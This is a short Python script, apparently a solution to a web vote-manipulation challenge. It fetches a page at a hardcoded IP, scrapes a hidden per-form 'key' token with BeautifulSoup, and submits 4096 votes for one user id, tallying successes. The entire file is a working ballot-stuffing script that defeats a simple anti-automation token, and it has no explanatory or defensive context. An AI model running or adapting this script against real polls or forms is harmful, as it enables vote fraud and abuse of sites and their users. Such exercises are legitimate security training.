#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import json

user_id = 3344
votes = 4096
url = 'http://158.69.76.135/level1.php'
success_votes = 0
error_votes = 0
value = 'ff981b26eaa8612bca994a26989bc826aabed3c2'

for i in range(0, votes):
    cookies_page = requests.session()
    r = cookies_page.get(url)
    print(r.cookies)

    soup = BeautifulSoup(r.text, 'html')
    key_value = soup.find('form').find('input', {'name': 'key'})['value']
    print(key_value)

    votation = {'id': user_id, 'holdthedoor': 'Submit', 'key': key_value}
    vote = cookies_page.post(url, data=votation)
    print(vote.cookies)

    if vote.status_code == 200:
        success_votes += 1
        print("success_votes: {}".format(success_votes))
    else:
        error_votes += 1
        print("error votes: {}".format(error_votes))

